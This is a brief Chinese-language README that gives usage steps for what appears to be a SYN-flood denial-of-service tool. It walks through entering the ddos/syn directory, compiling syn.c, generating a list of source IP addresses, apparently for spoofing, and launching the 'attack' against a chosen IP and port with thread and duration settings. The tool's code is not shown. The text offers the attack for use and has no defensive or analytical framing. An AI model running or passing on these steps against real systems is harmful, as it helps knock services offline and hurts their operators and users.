### 目录
    cd ddos/syn

### 编译
    gcc syn.c -o syn -pthread

### 生成源ip
    python3.8 main.py && shuf cn_syn_ip.txt


### 攻击
    ./syn ip port cn_syn_ip.txt 25 60
